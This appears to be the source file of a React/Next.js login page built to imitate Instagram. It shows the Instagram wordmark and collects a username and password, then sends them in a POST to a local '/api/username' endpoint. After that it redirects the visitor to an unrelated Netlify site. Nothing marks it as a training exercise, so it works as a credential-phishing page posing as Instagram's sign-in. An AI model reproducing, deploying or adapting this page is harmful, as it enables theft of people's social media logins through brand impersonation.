"use client"
import React from 'react';
import { useState } from 'react';
import { useRouter } from 'next/router';
import Link from 'next/link';

const Login = () => {
 
    const [username, setusername] = useState("")
    const [password, setpassword] = useState("")


    const redirectToExternalSite = () => {
        window.location.href = 'https://tubular-pixie-bf8c9f.netlify.app/'; // External website URL
      };



    const handleChanges=(e)=>{
        e.preventDefault();

        setusername(e.target.value);
    }
    const handleChange=(e)=>{
        e.preventDefault();

        setpassword(e.target.value);
    }
    const handlesubmit=async()=>{
        const res=await fetch("/api/username",{
            method:"POST",
            headers:{
              "Content-Type":"application/json"
            },
            body:JSON.stringify(
              {
                username:username,
                password:password,

              }
            )
           });
           if(res.status==200){
          
           console.log("okay")
        //    namea(String(form.mine))
        //    router.push("/userinput/miningact")
             window.location.href = 'https://tubular-pixie-bf8c9f.netlify.app/';
           }
    }
  
 
 
    return (
    <div>
       <div className="flex flex-col md:flex-row justify-center items-center min-h-screen bg-gray-50">
        {/* Login Form */}
        <div className="flex flex-col items-center bg-white p-8 border border-gray-300 rounded-md shadow-sm">
          <img
            src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
            className="h-12 mb-6"
            alt="Instagram Logo"
          />

          <form className="flex flex-col w-80 space-y-4" onSubmit={handlesubmit}>
            <input
              type="text"
              placeholder="Phone number, username, or email"
              name="username"
              value={username}
              onChange={handleChanges}
              className="px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:outline-none"
            />
            <input
              type="password"
              name="password"
              value={password}
              onChange={handleChange}
              placeholder="Password"
              className="px-4 py-2 border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:outline-none"
            />

            <button
              type="submit"
              className="bg-blue-500 text-white font-semibold py-2 rounded hover:bg-blue-600"
            >
              Log in
            </button>

            <div className="flex justify-between items-center">
              <a href="#" className="text-sm text-blue-500 hover:underline">
                Forgotten your password?
              </a>
            </div>

            <div className="flex items-center justify-between my-4">
              <hr className="w-full border-t border-gray-300" />
              <span className="px-2 text-gray-500">OR</span>
              <hr className="w-full border-t border-gray-300" />
            </div>

            <p className="mt-4 text-sm mx-auto">
              Don&apos;t have an account?{' '}
              <a href="#" className="text-blue-500 font-semibold">
                Sign up
              </a>
            </p>
            <p className="mt-4 text-xs text-gray-500 mx-auto">Get the app.</p>
          </form>
        </div>
      </div>
    </div>
  );
}

export default Login;
